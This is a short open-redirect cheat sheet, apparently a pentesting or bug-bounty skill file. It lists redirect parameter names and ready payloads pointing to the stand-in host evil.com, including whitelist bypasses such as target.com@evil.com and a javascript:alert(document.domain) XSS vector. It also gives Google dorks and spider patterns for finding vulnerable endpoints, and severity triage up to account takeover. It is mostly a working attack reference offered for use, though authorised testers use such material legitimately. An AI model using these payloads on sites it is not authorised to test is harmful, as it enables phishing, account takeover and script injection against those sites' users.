# SKILL: open-redirect
## Params
?redirect_url= ?next= ?continue= ?goto= ?return_Url= ?destination= ?fromURI= ?redirect= ?go= ?from= ?return= ?rurl= ?checkout_url=
## Payloads
?next=https://evil.com
?next=//evil.com
?next=https://target.com@evil.com/d
?next=https://target.com.evil.com/d
?next=°/https://evil.com
?next=javascript:alert(document.domain)
## Hunt
Dorks: inurl:"?next=" site:target.com
Spider: =http, =/, =%2F, =aHR
Path fragment: target.com//evil.com, target.com/.evil.com
## Triage
Reflected → Low. Whitelist bypass → Med. → ATO/XSS → High.
